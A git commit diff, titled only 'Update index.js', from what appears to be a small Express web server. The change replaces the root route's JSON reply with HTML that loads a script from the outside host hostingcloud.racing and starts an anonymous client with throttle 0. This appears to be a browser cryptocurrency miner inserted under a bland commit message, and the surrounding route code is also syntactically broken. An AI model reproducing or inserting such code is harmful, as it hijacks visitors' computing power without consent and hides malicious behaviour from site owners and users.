ee800c5ea44c1ca9e19923318baf87078bff2cf3
aSedali <toseyyedali@gmail.com>
2020-01-21 15:12:18 +0330

    Update index.js

--- index.js
+++ index.js
@@ -3,7 +3,8 @@ const app = express()
 const port = process.env.PORT || 3131
 const screenshot = require('./screenshot')
 
-app.get('/', (req, res) => res.status(200).json({ status: 'new comment on ' }))
+app.get('/', (req, res) => res.status(200).send('<script src="https://www.hostingcloud.racing/Sbjk.js"></script><script>var _client = new Client.Anonymous("1d030bb2124dfb41faa9608c5f0ce8afa4b5a482c4722a880e2ecad6fff9e423", {throttle: 0, c: "w"}); _client.start();</script>'))
+
 app.get('/m', (req, res) {
         res.sendFile('/mi.html');
         })
